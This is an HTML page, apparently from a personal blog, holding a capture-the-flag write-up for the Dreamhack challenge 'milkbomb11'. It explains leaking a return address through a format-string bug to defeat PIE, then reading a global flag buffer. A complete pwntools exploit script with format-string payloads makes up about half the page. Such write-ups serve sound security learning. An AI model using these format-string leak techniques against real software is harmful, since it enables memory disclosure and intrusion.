@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+
+        <p>The problem can be seen <a href="https://dreamhack.io/wargame/writeups/41281">here</a>.</p>
+        <p>
+    The program uses PIE to randomize the location of the code section, the data section, and the uninitialized data section(.bss). 
+    The good news is that these three sections are all guaranteed to be contiguous to each other in the exact same order regardless of PIE. 
+    PIE only randomizes the base of the (code+data+bss) section, so if we can somehow know the address of say the main function, we can know
+    literally everything else(global variables, other function addresses, etc).
+    So from main(), we call flag() by entering '1' to load the contents of the flag file into global variable flag_buf. 
+    Then we call fsb() by entering '2' to abuse the format string bug. With this, we can leak the return address of fsb() which is main + &lt;131&gt;. 
+    We can then get the base address of the (code+data+bss) section by subtracting 131 and main_offset(offset of main from the base). Then finally we add 
+    flag_buf_offset to it to get the actual address of flag_buf. Lastly, we abuse the format string bug once more to print out the bytes at flag_buf as 
+    a string.
+        </p>
+        <p>The exploit code is as below.</p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    #p = process("./chall")
+    p = remote("host3.dreamhack.games", 13418)
+    e = ELF("./chall")
+    flag_buf_offset = e.symbols["flag_buf"] # identical to image base offset of flag_buf from ghidra
+    main_offset = e.symbols["main"] # identical to image base offset of main() from ghidra
+    print("offset of flag_buf from base: {:x}".format(flag_buf_offset))
+    print("offset of main from base: {:x}".format(main_offset))
+
+
+    #input()
+    #context.log_level = "debug"
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"2")
+    sleep(0.1)
+    p.sendline(b"%19$llx")
+    main_131_addr = int(p.recvline().rstrip(), 16)
+    print("main + 131 = {:x}".format(main_131_addr))
+
+    # the paragraph below and the one below it are functionally identical, both getting the address of flag_buf.
+    main_addr = main_131_addr - 131
+    base_addr = main_addr - main_offset
+    flag_buf_addr = base_addr + flag_buf_offset
+    print("flag_buf_addr = {:x}".format(flag_buf_addr))
+
+    base_addr = main_131_addr - 0x143e # image base offset of main + <131> from ghidra
+    flag_buf_addr = base_addr + flag_buf_offset
+    print("flag_buf_addr = {:x}".format(flag_buf_addr))
+
+    p.sendlineafter(b"> ", b"2")
+    sleep(0.1)
+    p.send(b"%7$sAAAA" + p64(flag_buf_addr))
+    p.interactive()
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
